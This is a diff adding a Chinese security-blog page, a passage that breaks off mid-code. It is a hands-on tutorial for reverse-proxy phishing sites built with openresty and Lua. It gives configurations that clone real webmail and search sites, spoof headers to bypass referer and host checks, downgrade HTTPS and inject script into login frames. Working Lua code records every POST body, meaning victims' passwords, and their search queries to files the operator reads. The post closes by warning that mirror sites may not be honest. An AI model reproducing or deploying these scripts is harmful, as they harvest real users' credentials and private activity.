@@ -1,0 +1,920 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>openresty+lua在反向代理服务中的玩法 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                软件 &raquo; <a href="play-with-openresty-lua-web.html">openresty+lua在反向代理服务中的玩法</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">openresty+lua在反向代理服务中的玩法</h1>
+            <div class="details-up">
+  <span class="author">作者: None</span>
+  
+  <span class="category">分类: <a href="../sort/SOFT.html">软件</a></span>
+  
+  <span class="date">时间: 2015-5-31 12:17</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">12条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="play-with-openresty-lua-web.html">25074人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
+    
+        <a href="../tag/lua.html">lua</a>
+    
+        <a href="../tag/nginx.html">nginx</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <h2 id="0x01"><a class="toclink" href="#0x01">0x01 起因</a></h2>
+<p>几天前学弟给我介绍他用nginx搭建的反代，代理了谷歌和维基百科。 </p>
+<p>由此我想到了一些邪恶的东西：反代既然是所有流量走我的服务器，那我是不是能够在中途做些手脚，达到一些有趣的目的。</p>
+<p>openresty是一款结合了nginx和lua的全功能web服务器，我感觉其角色和tornado类似，既是一个中间件，也结合了一个后端解释器。所以，我们可以在nginx上用lua开发很多“有趣”的东西。</p>
+<p>所以，这篇文章也是由此而来。</p>
+<h2 id="0x02-openresty"><a class="toclink" href="#0x02-openresty">0x02 openresty的搭建</a></h2>
+<p>openresty是国人的一个开源项目，主页在http://openresty.org/ ，其核心nginx版本相对比较高（1.7.10），搭配的一些第三方模块也很丰富。</p>
+<p>首先在官网下载openresty源码，然后我还需要一个openresty中没有的第三方库：<a href="https://github.com/yaoweibin/ngx_http_substitutions_filter_module"><a href="https://github.com/yaoweibin/ngx_http_substitutions_filter_module">https://github.com/yaoweibin/ngx_http_substitutions_filter_module</a></a> ，同样下载下来。</p>
+<p>编译：</p>
+<div class="codehilite"><pre><span></span>./configure --with-http_sub_module --with-pcre-jit --with-ipv6 --add-module=/root/requirements/ngx_http_substitutions_filter_module
+make &amp;&amp; make install
+</pre></div>
+
+
+<p>编译选项中：</p>
+<p><code>--with-http_sub_module</code> 附带http_sub_module模块，这是nginx自带的一个模块，用来替换返回的http数据包中内容。</p>
+<p><code>--with-pcre-jit —with-ipv6</code> 提供ipv6支持</p>
+<p><code>--add-module=/root/requirements/ngx_http_substitutions_filter_module</code> （此处为你下载的ngx_http_substitutions_filter_module目录） 将刚才下载的http_substitutions_filter_module模块编译进去。http_substitutions_filter_module模块是http_sub_module的加强版，它可以用正则替换，并可以多处替换。</p>
+<p>编译安装的过程没有什么难点，很快就安装好了，openresty和luajit都默认在/usr/local/openresty目录下。nginx的二进制文件为/usr/local/openresty/nginx/sbin/nginx。</p>
+<p>然后像正常启动nginx一样启动之。</p>
+<h2 id="0x03"><a class="toclink" href="#0x03">0x03 反代目标网站</a></h2>
+<p>根据目标网站的不同，反代也是有难度之分的。</p>
+<p>比如乌云，我们可以很轻松地将其反代下来。因为乌云主站有一个特点：所有链接都是相对地址。所以我甚至不需要修改页面中任何内容即可完整反代。</p>
+<p>一个简单demo：<a href="http://wooyun.jjfly.party"><a href="http://wooyun.jjfly.party">http://wooyun.jjfly.party</a></a> ，其配置文件如下：</p>
+<p><a href="../content/uploadfile/201505/29551433045968.png"><img alt="image001.png" src="../content/uploadfile/201505/thum-29551433045968.png" /></a></p>
+<p>其中，location / 块即为反代乌云的配置块。</p>
+<p>proxy_pass 是将请求交给上游处理，而这里的上游就是http://wooyun.com</p>
+<p>proxy_cookie_domain是将所有cookie中的domain替换掉成自己的domain，达到能够登陆的效果。</p>
+<p>proxy_buffering off用来关闭内存缓冲区。</p>
+<p>proxy_set_header是一个重要的配置项，利用这个项可以修改转发时的HTTP头。比如，乌云在登录以后，修改资料的时候会验证referer，如果referer来自wooyun.jjfly.party是会提示错误的。所以我在这里用proxy_set_header将referer设置为wooyun.org域下的地址，从而绕过检查。</p>
+<p>这样，做好了一个完美的“钓鱼网站”：</p>
+<p><a href="../content/uploadfile/201505/25ae1433046480.png"><img alt="image003.png" src="../content/uploadfile/201505/thum-25ae1433046480.png" /></a></p>
+<p>我甚至可以正常登录、修改信息：</p>
+<p><a href="../content/uploadfile/201505/f3c81433046551.png"><img alt="image005.png" src="../content/uploadfile/201505/thum-f3c81433046551.png" /></a> </p>
+<p>但是并不是所有网站做反代都这样简单，比如google。谷歌是一个https的站点，所以通常也需要一个https的配置：</p>
+<p><a href="../content/uploadfile/201505/46071433045977.png"><img alt="image007.png" src="../content/uploadfile/201505/thum-46071433045977.png" /></a> </p>
+<p>我申请了一个SSL证书，反代方法和乌云类似。但不同的是，谷歌会检查host，如果host不是谷歌自己的域名就会强制302跳转到www.google.com。</p>
+<p>于是我在这里用proxy_set_header 将Host设置为www.google.com。</p>
+<p>另外，谷歌与乌云最大的不同是，其源码中链接均为绝对路径，所以一旦用户点击其中链接后又会跳转回谷歌去。所以，我这里使用了subs_filter模块将其中的字符串“<a href="http://www.google.com">www.google.com</a>”替换成“xdsec.mhz.pw”。</p>
+<p>这是反代中经常会遇到的情况。</p>
+<p>那么，如果我并没有条件购买SSL证书怎么办？其实我们在nginx配置中也是可以将https降成http的。比如 <a href="http://qq.jjfly.party"><a href="http://qq.jjfly.party">http://qq.jjfly.party</a></a> 就是代理的<a href="https://mail.qq.com"><a href="https://mail.qq.com">https://mail.qq.com</a></a>：</p>
+<p><a href="../content/uploadfile/201505/7dfd1433046621.png"><img alt="image009.png" src="../content/uploadfile/201505/thum-7dfd1433046621.png" /></a></p>
+<p>另外，在xui.qq.jjfly.party（登陆框的frame）中，我利用 <code>subs_filter &lt;/head&gt; "&lt;script&gt;alert('xxx');&lt;/script&gt;&lt;/head&gt;";</code> ，在html的<code>&lt;/head&gt;</code>标签前插入了一段javascript，通过这个方式，我可以简单制作一个前端的数据截取。（XSS）</p>
+<p>打开即会弹窗：</p>
+<p><a href="../content/uploadfile/201505/e1fb1433045986.png"><img alt="image011.png" src="../content/uploadfile/201505/thum-e1fb1433045986.png" /></a></p>
+<p>在反代过程中，我们会常常和gzip打交道。熟悉http协议的同学应该知道，如果浏览器发送的数据包头含有Accept-Encoding: gzip，即告诉服务器：“我可以接受gzip压缩过的数据包”。这时后端就会将返回包压缩后发送，并包含返回头Content-Encoding: gzip，浏览器根据是否含有这个头对返回数据包进行解压显示。</p>
+<p>但gzip在反代中，会造成很大问题：subs_filter替换内容时，如果内容是压缩过的，明显就不能正常替换了。同时在日志里可以看到这样的记录：</p>
+<blockquote>
+<p>http subs filter header ignored, this may be a compressed response. while reading response header from upstream</p>
+</blockquote>
+<p>所以网上一般处理方式是，在向上层服务器转发数据包的时候，设置proxy_set_header Accept-Encoding ""，这样后端服务器就不会压缩数据包了。</p>
+<p>但有时候，做反代的时候会发现subs_filter的替换失效或部分失效了，我在做126.com反代的时候就遇到了这个问题。经过一段时间的研究发现，可能和缓存有关系，缓存中的数据包是gzip压缩过的，所以就算发送Accept-Encoding=""也不管用。</p>
+<p>如下是http://126.jjfly.party 配置：</p>
+<p><a href="../content/uploadfile/201505/47c11433045993.png"><img alt="image013.png" src="../content/uploadfile/201505/thum-47c11433045993.png" /></a> </p>
+<p>我设置了很多阻止其缓存的方法，但实际上好像并没有效果。</p>
+<p>于是这里我想到借助lua，我想通过lua脚本在数据包返回的时候解压缩gzip数据，并代替subs_filter进行字符串的替换。</p>
+<h2 id="0x04-luagzip"><a class="toclink" href="#0x04-luagzip">0x04 借助lua进行gzip解压与返回包修改</a></h2>
+<p>openresty在编译安装的时候就加入了lua支持，所以无需再对nginx进行改造。但lua下对gzip进行解压，需要借助一个库：lua-zlib（<a href="https://github.com/brimworks/lua-zlib"><a href="https://github.com/brimworks/lua-zlib">https://github.com/brimworks/lua-zlib</a></a>）</p>
+<p>lua是一个和C语言结合紧密的脚本语言，实际上lua-zlib就是一个C语言编写的库，我们现在需要做的就是将其编译成一个动态链接库zlib.so，让lua来引用。</p>
+<div class="codehilite"><pre><span></span>git clone https://github.com/brimworks/lua-zlib.git
+cd lua-zlib
+cmake -DLUA_INCLUDE_DIR=/usr/local/openresty/luajit/include/luajit-2.1 -DLUA_LIBRARIES=/usr/local/openresty/luajit/lib -DUSE_LUAJIT=ON -DUSE_LUA=OFF
+make &amp;&amp; make install
+</pre></div>
+
+
+<p>以上代码解释一下。首先执行cmake来生成编译配置文件。LUA_INCLUDE_DIR指定luajit的include文件夹，LUA_LIBRARIES指定luajit的lib文件夹。USE_LUAJIT=ON和USE_LUA=OFF指定我们使用的是luajit而不是lua：</p>
+<p><a href="../content/uploadfile/201505/4c4f1433045996.png"><img alt="image015.png" src="../content/uploadfile/201505/thum-4c4f1433045996.png" /></a></p>
+<p>再执行<code>make &amp;&amp; make install</code>即可：</p>
+<p><a href="../content/uploadfile/201505/37991433045999.png"><img alt="image017.png" src="../content/uploadfile/201505/thum-37991433045999.png" /></a></p>
+<p>这时候已经编译好了zlib.so，拷贝到openresty的lib目录下即可：</p>
+<div class="codehilite"><pre><span></span>cp zlib.so /usr/local/openresty/lualib/zlib.so
+</pre></div>
+
+
+<p>然后回到nginx的配置文件中，<code>body_filter_by_lua_file /usr/local/openresty/luasrc/repl.lua;</code>这句话告诉nginx我需要把返回包的body交给repl.lua处理。</p>
+<p>repl.lua脚本：</p>
+<div class="codehilite"><pre><span></span><span class="kd">local</span> <span class="n">zlib</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;zlib&quot;</span>
+<span class="kr">function</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+    <span class="kr">if</span> <span class="n">unexpected_condition</span> <span class="kr">then</span> <span class="nb">error</span><span class="p">()</span> <span class="kr">end</span>
+    <span class="kd">local</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">zlib</span><span class="p">.</span><span class="n">inflate</span><span class="p">()</span>
+    <span class="kd">local</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">stream</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+    <span class="kr">return</span> <span class="n">ret</span>
+<span class="kr">end</span>
+
+<span class="kr">function</span> <span class="nf">callback</span><span class="p">()</span>
+    <span class="kd">local</span> <span class="n">str</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">str</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s2">&quot;https://&quot;</span><span class="p">,</span> <span class="s2">&quot;http://&quot;</span><span class="p">)</span>
+    <span class="n">str</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s2">&quot;mail.126.com&quot;</span><span class="p">,</span> <span class="s2">&quot;126.jjfly.party&quot;</span><span class="p">)</span>
+    <span class="n">str</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s1">&#39;&quot;126.com&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;&quot;126.jjfly.party&quot;&#39;</span><span class="p">)</span>
+    <span class="n">str</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s2">&quot;&#39;126.com&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;&#39;126.jjfly.party&#39;&quot;</span><span class="p">)</span>
+    <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span>
+<span class="kr">end</span>
+
+<span class="kr">function</span> <span class="nf">writefile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">file</span> <span class="o">=</span> <span class="nb">io.open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s2">&quot;ab&quot;</span><span class="p">)</span>
+    <span class="n">file</span><span class="p">:</span><span class="n">write</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
+    <span class="n">file</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+<span class="kr">end</span>
+
+<span class="kr">function</span> <span class="nf">readfile</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">file</span> <span class="o">=</span> <span class="nb">io.open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;*all&quot;</span><span class="p">)</span>
+    <span class="n">file</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+    <span class="kr">return</span> <span class="n">data</span>
+<span class="kr">end</span>
+
+<span class="kd">local</span> <span class="n">token</span> <span class="o">=</span> <span class="n">getClientIp</span><span class="p">()</span><span class="o">..</span><span class="n">ngx</span><span class="p">.</span><span class="n">var</span><span class="p">.</span><span class="n">uri</span>
+<span class="kd">local</span> <span class="n">tmpfile</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">shared</span><span class="p">.</span><span class="n">tmpfile</span>
+<span class="kd">local</span> <span class="n">value</span><span class="p">,</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">tmpfile</span><span class="p">:</span><span class="n">get</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+
+<span class="kr">if</span> <span class="ow">not</span> <span class="n">value</span> <span class="kr">then</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="o">..</span><span class="n">randstr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">tmpfile</span><span class="p">:</span><span class="n">set</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+<span class="kr">end</span>
+
+<span class="kr">if</span> <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">~=</span> <span class="s1">&#39;&#39;</span> <span class="kr">then</span>
+    <span class="n">writefile</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="kr">end</span>
+<span class="kr">if</span> <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="kr">then</span>
+    <span class="kd">local</span> <span class="n">body</span> <span class="o">=</span> <span class="n">readfile</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">status</span><span class="p">,</span> <span class="n">debody</span> <span class="o">=</span> <span class="nb">pcall</span><span class="p">(</span><span class="n">decode</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+    <span class="kr">if</span> <span class="n">status</span> <span class="kr">then</span>
+        <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">debody</span>
+    <span class="kr">end</span>
+    <span class="nb">os.remove</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+    <span class="n">callback</span><span class="p">()</span>
+    <span class="kr">return</span> 
+<span class="kr">else</span>
+    <span class="n">ngx</span><span class="p">.</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kc">nil</span>
+<span class="kr">end</span>
+</pre></div>
+
+
+<p>思路是个简单粗暴的方式：ngx.arg[1]是原始的body，我将之交给pcall（lua下的异常处理方式），利用zlib.inflate进行解压。如果不出异常说明解压成功了，就将结果覆盖ngx.arg[1]，抛出异常了说明body可能是没压缩的，就保持不变。</p>
+<p>但实际操作中遇到几个困难：</p>
+<ol>
+<li>数据包并不是一次全部交给repl.lua，而是被分成许多chunks。所以我判断了一下，当数据包没有接收完整的时候就先保存在一个临时文件中，直到eof，我才将之解压缩发送给客户端。</li>
+<li>多用户情况下，我需要区分临时文件属于哪个用户。所以我将临时文件名保存在ngx.shared中，根据IP+uri判断（实际上也并不完美）。</li>
+<li>lua生成的随机数并不会自动播种，所以我需要根据系统时间来设置随机数种子。 </li>
+</ol>
+<p>最后，解压完成后我直接调用callback()函数在其中对数据包进行替换，实际上就是完成之前subs_filter做的那些操作。<br />
+这样配置完成后，重启nginx，用浏览器访问将会发现一个问题：</p>
+<p><a href="../content/uploadfile/201505/d7151433046001.png"><img alt="image019.png" src="../content/uploadfile/201505/thum-d7151433046001.png" /></a></p>
+<p>提示是：ERR_CONTENT_DECODING_FAILED，但我用burpsuite发包会发现似乎一切正常：</p>
+<p><a href="../content/uploadfile/201505/b2691433046390.png"><img alt="image021.png" src="../content/uploadfile/201505/thum-b2691433046390.png" /></a></p>
+<p>其实这个问题我之前都说了，还是和gzip有关。我们看到上图，返回包中含有Content-Encoding: gzip，当我们的浏览器查看到此头后，会认为数据包是gzip压缩过的。</p>
+<p>但实际上我们已经在lua中将其解压缩了，所以返回的数据其实是没压缩过的。最终导致浏览器解压出错，造成ERR_CONTENT_DECODING_FAILED。<br />
+怎么解决？</p>
+<p>在nginx配置中将返回包头中的Content-Encoding设置为空就好了：</p>
+<p><a href="../content/uploadfile/201505/65041433046009.png"><img alt="image023.png" src="../content/uploadfile/201505/thum-65041433046009.png" /></a></p>
+<p>header_filter_by_lua就是在修改返回头的配置。后面可以直接编写lua脚本，将ngx.header["Content-Encoding"]=""。</p>
+<p>这时就可以正常访问了：</p>
+<p><a href="../content/uploadfile/201505/db8f1433046267.png"><img alt="image025.png" src="../content/uploadfile/201505/thum-db8f1433046267.png" /></a> </p>
+<h2 id="0x05-lua"><a class="toclink" href="#0x05-lua">0x05 利用lua截取数据</a></h2>
+<p>那么，lua除了能够解决上述的解压缩问题以外，还有没有什么新玩法？</p>
+<p>这时候，理应就想到就是数据包的截获。钓鱼网站的最终目的就是获取用户的信息，我在前面说到了可以通过在前端插入javascript脚本来截取用户的输入。</p>
+<p>但实际上这并不是最好的方案，最好的方法就是在后端截取数据包。</p>
+<p>于是我来使用lua完成这个任务。首先在nginx的server块外面（主配置文件中）加入配置项：</p>
+<div class="codehilite"><pre><span></span>init_by_lua_file  /usr/local/openresty/luasrc/init.lua;
+access_by_lua_file /usr/local/openresty/luasrc/fish.lua;
+</pre></div>
+
+
+<p>这两项在ngx_lua_waf中也介绍过。init_by_lua_file是在nginx启动的时候加载并执行的lua脚本，access_by_lua_file是在一次HTTP请求开始前执行的lua脚本。</p>
+<p>init_by_lua_file一般是初始化一些全局使用的函数，不多说了。说一下我写的access_by_lua_file时调用的fish.lua：</p>
+<div class="codehilite"><pre><span></span><span class="kd">local</span> <span class="n">method</span><span class="o">=</span><span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_method</span><span class="p">()</span>
+<span class="kr">if</span> <span class="n">in_array</span><span class="p">(</span><span class="n">ngx</span><span class="p">.</span><span class="n">var</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">valid_host</span><span class="p">)</span> <span class="kr">then</span>
+<span class="kr">if</span> <span class="n">method</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span> <span class="kr">then</span>
+    <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">read_body</span><span class="p">()</span>
+    <span class="kd">local</span> <span class="n">data</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_body_data</span><span class="p">()</span>
+    <span class="n">writefile</span><span class="p">(</span><span class="s2">&quot;/home/wwwroot/fish/&quot;</span><span class="o">..</span><span class="n">ngx</span><span class="p">.</span><span class="n">var</span><span class="p">.</span><span class="n">host</span><span class="o">..</span><span class="s2">&quot;.txt&quot;</span><span class="p">,</span> <span class="n">data</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="kr">end</span>
+<span class="kr">end</span>
+</pre></div>
+
+
+<p>当host在valid_host（钓鱼站的host）中时，判断如果请求是POST请求，就将数据包的body写入<code>"/home/wwwroot/fish/"..ngx.var.host..".txt"</code> 中。</p>
+<p>这时，我访问<a href="http://126.jjfly.party/admin/126.jjfly.party.txt"><a href="http://126.jjfly.party/admin/126.jjfly.party.txt">http://126.jjfly.party/admin/126.jjfly.party.txt</a></a> 就可以看到实时钓鱼的结果：</p>
+<p><a href="../content/uploadfile/201505/ae3c1433046106.png"><img alt="image027.png" src="../content/uploadfile/201505/thum-ae3c1433046106.png" /></a> </p>
+<p>乌云也一样：<a href="http://wooyun.jjfly.party/admin/wooyun.jjfly.party.txt"><a href="http://wooyun.jjfly.party/admin/wooyun.jjfly.party.txt">http://wooyun.jjfly.party/admin/wooyun.jjfly.party.txt</a></a></p>
+<p><a href="../content/uploadfile/201505/3ac41433046108.png"><img alt="image029.png" src="../content/uploadfile/201505/thum-3ac41433046108.png" /></a></p>
+<p>QQ邮箱那个因为环境太复杂（有至少三个host需要反代），所以我宁愿选择在前端插入脚本进行劫持。</p>
+<p>除了记录用户输入的账号密码，根据反代网站的类型不同还能截取很多有趣的东西。</p>
+<p>比如谷歌，我可以记录访客在谷歌中查询的内容：</p>
+<p><a href="../content/uploadfile/201505/7d891433046110.png"><img alt="image031.png" src="../content/uploadfile/201505/thum-7d891433046110.png" /></a> </p>
+<p>脚本也很简单：</p>
+<div class="codehilite"><pre><span></span><span class="kr">if</span> <span class="n">ngx</span><span class="p">.</span><span class="n">var</span><span class="p">.</span><span class="n">host</span> <span class="o">==</span> <span class="s2">&quot;xdsec.mhz.pw&quot;</span> <span class="kr">then</span>
+    <span class="kd">local</span> <span class="n">args</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_uri_args</span><span class="p">()</span>
+    <span class="kr">if</span> <span class="n">args</span><span class="p">[</span><span class="s2">&quot;q&quot;</span><span class="p">]</span> <span class="kr">then</span>
+        <span class="n">writefile</span><span class="p">(</span><span class="s2">&quot;/home/wwwroot/fish/&quot;</span><span class="o">..</span><span class="n">ngx</span><span class="p">.</span><span class="n">var</span><span class="p">.</span><span class="n">host</span><span class="o">..</span><span class="s2">&quot;.txt&quot;</span><span class="p">,</span>  <span class="s2">&quot;search: &quot;</span> <span class="o">..</span> <span class="n">args</span><span class="p">[</span><span class="s2">&quot;q&quot;</span><span class="p">]</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="kr">end</span>
+<span class="kr">end</span>
+</pre></div>
+
+
+<p>可见，虽然你看到的流量是经过一个拥有正规的证书的https站点的。但实际上我在写lua脚本的时候根本不用在乎流量是否加密，因为openresty总会将一个明文的数据包交给我处理。</p>
+<p>那么：Youtube，我们可以记录访客看过哪些视频；wikipedia，我们可以记录用户搜索过哪些姿势；1024，我们可以记录哪些片子的点击率最高……（笑）</p>
+<p>自从各大国外站点陆续从互联网上消失以后，现在镜像网站越来越多。但上面的案例也说明了，镜像网站也并不一定都是正直的。</p>
+<h2 id="0x06-redis"><a class="toclink" href="#0x06-redis">0x06 结合缓存与redis提升反代效率</a></h2>
+<p>当然openresty绝不仅仅是拥有这样一些简单的功能。openresty出现的定义就是一个“全功能的 Web 应用服务器”，所以php可以有的功能它都可以办到。</p>
+<p>简单来说我们可以直接在openresty上用lua编写一个完整的动态网站。</p>
+<p>之前我们的反代配置，有一些无法避免的缺点：</p>
+<ol>
+<li>对gzip的支持不好，要不就是不使用压缩，要不就是需要解压，效率较低</li>
+<li>没有使用缓存，请求频繁、并发量大的情况下nginx可能被上游服务器封掉。 </li>
+<li>后端没有进行负债均衡。 </li>
+</ol>
+<p>如果仅仅是钓鱼的话，效率低是问题不大的，因为访问量不会太大。但如果你想做一个使用量大的谷歌镜像之类的网站，就必须要考虑这个问题了。</p>
+<p>如何缓解这个问题？</p>
+<p>比如，我们可以利用谷歌全球的IP进行负载均衡：</p>
+<div class="codehilite"><pre><span></span><span class="nt">proxy_cache_path</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">google</span><span class="o">/</span>  <span class="nt">levels</span><span class="o">=</span><span class="nt">1</span><span class="p">:</span><span class="nd">2</span>   <span class="nt">keys_zone</span><span class="o">=</span><span class="nt">g1</span><span class="p">:</span><span class="nd">100m</span> <span class="nt">max_size</span><span class="o">=</span><span class="nt">1g</span><span class="o">;</span>
+<span class="nt">proxy_cache_key</span> <span class="s2">&quot;$host$request_uri&quot;</span><span class="o">;</span>
+
+<span class="nt">upstream</span> <span class="nt">google</span><span class="p">{</span>
+<span class="err">server</span> <span class="err">216.58.220.132:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="err">server</span> <span class="err">131.203.2.49:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="err">server</span> <span class="err">216.58.209.165:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="err">server</span> <span class="err">209.85.229.53:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="err">server</span> <span class="err">173.194.122.22:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="err">server</span> <span class="err">216.58.209.101:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="err">server</span> <span class="err">173.194.126.65:443</span> <span class="err">max_fails=3</span> <span class="err">fail_timeout=10s</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>另外，利用proxy_cache进行缓存，可以减少很多反代服务器向上游服务器请求的次数，防止被封。</p>
+<p>当然，除了使用文件缓存以外，openresty还可以使用一些效率更高的服务，比如redis。</p>
+<p>openresty自带了一个redis客户端lua-resty-redis：<a href="https://github.com/openresty/lua-resty-redis"><a href="https://github.com/openresty/lua-resty-redis">https://github.com/openresty/lua-resty-redis</a></a> （openresty还有个RedisNginxModule模块，这个是反代redis请求的，并不是redis客户端）</p>
+<p>不过，现今的openresty对于redis模块（包括所有依赖于socket的模块）的支持仅限于在rewrite_by_lua, access_by_lua, content_by_lua这三个context中，也就是说我们没法将返回的数据包储存于redis中，但我们可以将截取到的数据储存于redis中。</p>
+<p>还是以谷歌为例，我将查询结果按照IP来存入redis：</p>
+<div class="codehilite"><pre><span></span><span class="n">red</span> <span class="o">=</span> <span class="n">redis</span><span class="p">:</span><span class="n">new</span><span class="p">()</span>
+<span class="n">red</span><span class="p">:</span><span class="n">set_timeout</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+<span class="kd">local</span> <span class="n">ok</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">red</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">6379</span><span class="p">)</span>
